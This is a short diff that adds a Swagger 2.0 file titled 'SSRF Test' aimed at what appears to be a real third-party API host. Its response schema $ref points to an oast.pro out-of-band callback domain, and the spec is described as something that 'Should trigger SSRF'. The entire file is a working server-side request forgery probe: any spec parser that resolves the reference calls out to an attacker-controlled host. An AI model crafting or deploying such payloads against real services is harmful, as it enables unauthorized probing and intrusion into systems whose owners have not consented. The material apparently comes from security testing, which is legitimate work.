@@ -1,1 +1,16 @@
-url: "http://d0p06devqmnt395lcvg0hgm5ej17fazy1.oast.pro/"
+swagger: "2.0"
+info:
+  title: "SSRF Test"
+  version: "1.0"
+host: "api.tektiklaode.visa.com.tr"
+schemes:
+  - https
+paths:
+  /test:
+    get:
+      summary: "SSRF Trigger"
+      responses:
+        200:
+          description: "Should trigger SSRF"
+          schema:
+            $ref: "http:// d0p06devqmnt395lcvg0hgm5ej17fazy1.oast.pro/"
